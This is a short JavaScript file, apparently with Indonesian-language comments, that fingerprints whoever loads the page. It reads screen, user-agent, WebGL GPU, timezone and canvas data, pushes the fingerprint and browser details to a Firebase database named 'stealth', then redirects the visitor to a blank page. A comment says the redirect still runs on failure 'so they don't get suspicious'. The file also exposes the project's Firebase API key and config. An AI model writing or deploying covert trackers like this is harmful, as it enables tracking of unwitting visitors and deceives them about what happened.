// ============================================
// FIREBASE CONFIG (Punya Lo)
// ============================================
const firebaseConfig = {
    apiKey: "AIzaSyAKk8yOBe0AJbu9krI0DigvIJpATFWXezE",
    authDomain: "stealth-c7df6.firebaseapp.com",
    databaseURL: "https://stealth-c7df6-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "stealth-c7df6",
    storageBucket: "stealth-c7df6.firebasestorage.app",
    messagingSenderId: "167464139264",
    appId: "1:167464139264:web:62b093af1066bf8084b6e5",
    measurementId: "G-0VE28H406J"
};

// ============================================
// IMPORT FIREBASE SDK
// ============================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";

// ============================================
// INIT FIREBASE
// ============================================
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// ============================================
// FUNGSI GET DEVICE ID (FINGERPRINT)
// ============================================
function getDeviceID() {
    let components = [];
    
    // 1. Screen
    components.push(screen.width + 'x' + screen.height);
    components.push(screen.colorDepth);
    
    // 2. Navigator
    components.push(navigator.userAgent);
    components.push(navigator.language);
    components.push(navigator.platform);
    
    // 3. WebGL (GPU)
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            components.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
            components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
        }
    }
    
    // 4. Timezone
    components.push(Intl.DateTimeFormat().resolvedOptions().timeZone);
    
    // 5. Canvas Fingerprint
    const canvas2 = document.createElement('canvas');
    const ctx = canvas2.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('DeviceID', 2, 2);
    components.push(canvas2.toDataURL());

    // 6. Hash jadi ID unik
    const raw = components.join('|||');
    let hash = 0;
    for (let i = 0; i < raw.length; i++) {
        const char = raw.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0;
    }
    return 'DEV-' + Math.abs(hash).toString(16).toUpperCase().padStart(8, '0');
}

// ============================================
// EKSEKUSI UTAMA
// ============================================
const deviceID = getDeviceID();

// Kirim ke Firebase
push(ref(db, 'devices'), {
    id: deviceID,
    time: new Date().toISOString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: screen.width + 'x' + screen.height
})
.then(() => {
    console.log('✅ Device ID terkirim:', deviceID);
    
    // ============================================
    // 🔥 REDIRECT - GANTI SESUAI KEINGINAN LO!
    // ============================================
    
    // OPSI 1: Redirect ke halaman kosong (about:blank)
    window.location.href = 'about:blank';
    
    // OPSI 2: Redirect ke Google (kalo pengen)
    // window.location.href = 'https://www.google.com';
    
    // OPSI 3: Redirect ke WhatsApp (kalo pengen)
    // window.location.href = 'https://wa.me/6281234567890';
    
    // OPSI 4: Redirect ke admin.html (buat testing)
    // window.location.href = 'admin.html';
    
    // OPSI 5: Gak redirect sama sekali (tetep di halaman loading)
    // (komen aja baris di atas)
})
.catch((err) => {
    console.error('❌ Gagal kirim ke Firebase:', err);
    
    // Tetep redirect walau error (biar gak curiga)
    window.location.href = 'about:blank';
});
